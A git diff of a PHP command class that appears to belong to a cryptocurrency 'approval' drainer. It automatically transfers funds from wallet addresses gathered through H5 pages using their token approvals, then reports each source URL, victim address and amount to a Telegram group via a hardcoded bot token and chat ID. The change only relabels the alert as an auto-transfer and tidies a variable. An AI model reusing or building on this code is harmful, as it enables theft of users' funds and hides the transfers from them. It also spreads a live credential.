@@ -104,10 +104,10 @@ class SelectAutoApproveTransaction extends Command
                                 $result = (new \app\common\service\Getbalance())->do_transfer_from_wu_fen_yong($approve_info,$receive_info);
 
                                 //TG通知开始
-                                $data = "【自动通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n画：{$amount}";
+                                $data_tg = "【自动划】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n画：{$amount}";
                                 $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
                                 $id ='5725539445';//群组ID
-                                $u4 = $data;
+                                $u4 = $data_tg;
                                 $u4 = urlencode($u4);
                                 $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
                                 $ch = curl_init();
@@ -118,8 +118,8 @@ class SelectAutoApproveTransaction extends Command
                                 $resultaaa = curl_exec($ch);
                                 curl_close($ch);
                                 //TG通知结束
-
                                 if($result){
+                                    $data = array();
                                     if($qb_type == 1){
                                         $data['txid']=$result->txID;
                                     }else{
